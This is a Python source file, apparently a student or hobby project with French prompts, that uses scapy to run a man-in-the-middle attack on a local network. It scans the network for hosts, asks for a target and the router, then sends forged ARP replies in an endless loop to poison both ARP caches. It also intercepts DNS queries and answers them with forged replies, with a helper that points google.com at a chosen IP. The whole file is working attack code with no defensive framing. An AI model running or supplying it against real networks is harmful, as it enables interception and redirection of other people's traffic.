from ipaddress import IPv4Network
from scapy import all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from socket import *
from fcntl import ioctl
from struct import pack
import os

def interfaceChecker():
    if os.uname()[1] == 'machine':
        interface = 'enp0s8'
    else:
        interface = 'wlp0s20f3'
    return interface

def getNetworkMask(interface):
    s = socket(AF_INET, SOCK_DGRAM)
    netmask = ioctl(s.fileno(), 0x891b, pack('256s', interface[:15].encode('utf-8')))[20:24]
    return inet_ntoa(netmask)

def makeARPRequest(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpRequestBroadcast = broadcast / arpRequest
    (answered, unanswered) = scapy.srp(arpRequestBroadcast, timeout=1, verbose=0)
    return answered, unanswered

def dnsSpoofing(targetIP, spoofIP,sourceIP):
    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='google.com'))
    answer = scapy.sr1(packet)
    answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
    answer[scapy.DNS].ancount = 1
    # del answer[scapy.IP].len
    # del answer[scapy.IP].chksum
    # del answer[scapy.UDP].len
    # del answer[scapy.UDP].chksum
    return answer

def forwardDnsSpoofing():
    def forwardDNS(orgPacket: IP):
        packet = scapy.IP(dst='127.0.0.1') 
        packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=5353)
        packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
        answer = scapy.sr1(packet, verbose=0)
        print('Repsonse received')
        responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
        responsePacket[DNS] = answer[DNS]
        responsePacket.show()
        scapy.send(responsePacket, verbose=0)
    print('DNS spoofing started')
    return forwardDNS

def main():
    interface = interfaceChecker()
    netmask = getNetworkMask(interface)
    myIp=scapy.get_if_addr(interface)
    myMac=scapy.get_if_hwaddr(interface)
    address = IPv4Network(myIp + '/' + netmask, False)
    ip = address.network_address
    pcs=[]
    addressMask = address.prefixlen
    answered, unanswered = makeARPRequest(str(ip)+'/'+str(addressMask))
    for element in answered:
        pcs.append([element[1].hwsrc, element[1].psrc])
    pcs.sort(key=lambda x: [int (y) for y in x[1].split('.')])
    compteur = 0
    for pc in pcs:
        print(str(compteur+1)+ ' - ' + pc[0] + ' ' + pc[1])
        compteur+=1
    cible=input('Entrez le numéro de la cible : ')
    cible=pcs[int(cible)-1]
    print('Vous avez choisi : ' + cible[0] + ' ' + cible[1])
    routeur=input('Entrez le numéro du routeur : ')
    routeur=pcs[int(routeur)-1]
    print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
    scapy.AsyncSniffer(prn=forwardDnsSpoofing(), filter='udp port 53 and not ip dst 127.0.0.1', iface=interface).start()
    while True:
        scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
        scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
        scapy.time.sleep(1)

if __name__ == '__main__':
    main()